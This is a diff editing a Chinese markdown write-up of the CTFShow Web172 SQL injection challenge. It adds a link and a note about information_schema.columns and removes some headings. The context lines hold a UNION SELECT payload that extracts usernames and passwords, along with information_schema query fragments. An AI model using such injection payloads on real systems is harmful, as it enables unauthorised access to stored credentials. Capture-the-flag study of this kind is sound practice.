@@ -1,8 +1,8 @@
-  
 
+[[ctfshow_入门_web_sql由此开始]]
 # CTFShow Web172 · SQL 注入复盘
 
-赛博朋克霓虹笔记版：漏洞点、绕过思路与踩坑总结一次看完。
+
 
 #SQLi #UnionSelect #InformationSchema #CTFShow
 
@@ -57,8 +57,8 @@ APPROACH 03
 ```
 ' union select id,username,password from ctfshow_user2 --+
 ```
+ **其实 `information_schema.columns` 里面就包含了 `库，表，字段` ,没必要麻烦去访问其他的schema表**
 
-PITFALL
 
 ### 我踩过的坑 高频误区
 
@@ -75,7 +75,6 @@ from information_schema.columns where table_name='user' --+
 ... and table_schema='ctfshow_web'
 ```
 
-KNOWLEDGE POINT
 
 ### 关于 ORDER BY 的纠偏
 
